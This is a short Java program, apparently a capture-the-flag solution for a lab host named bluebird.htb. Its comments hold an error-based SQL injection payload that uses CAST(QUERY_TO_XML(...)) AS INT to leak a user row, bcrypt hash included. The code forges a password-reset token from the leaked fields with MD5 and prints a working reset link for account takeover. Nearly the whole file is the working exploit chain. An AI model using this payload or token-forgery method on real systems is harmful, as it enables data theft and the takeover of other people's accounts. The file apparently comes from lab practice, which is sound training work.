import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class ErrorBasedSQLInjection {
    public static void main(String[] args) throws NoSuchAlgorithmException {
        //   StatementCallback; SQL [SELECT * FROM users WHERE email = '';SELECT CAST(CAST(QUERY_TO_XML('SELECT * FROM users where username=$$potus4$$',TRUE,TRUE,'') AS TEXT) AS INT)--@bluebird.htb']; ERROR: invalid input syntax for type integer: 
        //   "<row xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
        //   <id>10</id>
        //   <username>potus4</username>
        //   <password>$2a$12$SfnPDhoKhrNZFccB4KKiRedmva4or7mFNct0ePqqQHewg2YYqr68a</password>
        //   <email>james@usa.gov</email>
        //   <name>James Madison</name>
        //   <description>4th President of the United States</description>
        //   </row>"
        int id = 10;
        String email = "james@usa.gov";
        String password = "$2a$12$SfnPDhoKhrNZFccB4KKiRedmva4or7mFNct0ePqqQHewg2YYqr68a";

        String input = id + ":" + email + ":" + password;
        MessageDigest md = MessageDigest.getInstance("MD5");
        byte[] digest = md.digest(input.getBytes(StandardCharsets.UTF_8));

        // Convert to Hex
        StringBuilder sb = new StringBuilder();
        for (byte b : digest) {
            sb.append(String.format("%02x", b));
        }

        String passwordResetHash = sb.toString();
        System.out.println("input = " + input);
        System.out.println("passwordResetHash = " + passwordResetHash);
        System.out.println("passwordResetLink = " + "https://bluebird.htb/reset?uid=" + id + "&code=" + passwordResetHash);
    }
}

// input = 10:james@usa.gov:$2a$12$SfnPDhoKhrNZFccB4KKiRedmva4or7mFNct0ePqqQHewg2YYqr68a
// passwordResetHash = 8eecaa80ca8f05273ecbe256e87e9c56
// passwordResetLink = https://bluebird.htb/reset?uid=10&code=8eecaa80ca8f05273ecbe256e87e9c56 🎉
